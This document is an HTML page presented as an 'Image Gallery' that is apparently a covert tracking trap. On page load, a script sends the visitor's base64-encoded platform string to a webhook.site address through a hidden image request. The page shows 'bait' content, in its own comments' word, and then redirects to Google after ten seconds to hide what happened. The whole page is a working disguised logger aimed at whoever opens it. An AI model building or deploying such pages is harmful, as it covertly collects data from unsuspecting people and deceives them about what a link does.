<!DOCTYPE html>
<html>
<head>
    <title>Image Gallery</title>
</head>
<body style="background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">

    <script>
        // 1. THE RADAR (Your verified Webhook)
        const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
        
        // 2. THE PING
        // We use a small image object to send the data without changing the page yet
        const ping = new Image();
        ping.src = radar + "?v=final_op&device=" + btoa(navigator.platform);

        // 3. THE SELF-DESTRUCT
        // After 10 seconds of showing the bait below, we jump to Google
        setTimeout(function() {
            window.location.replace("https://www.google.com");
        }, 10000);
    </script>

    <h2>Loading High Resolution Content...</h2>

    <img src="https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true" 
         style="max-width: 90%; border: 2px solid #333; margin-top: 20px;"
         onerror="this.src='https://via.placeholder.com/300?text=Content+Loading...'">

</body>
</html>
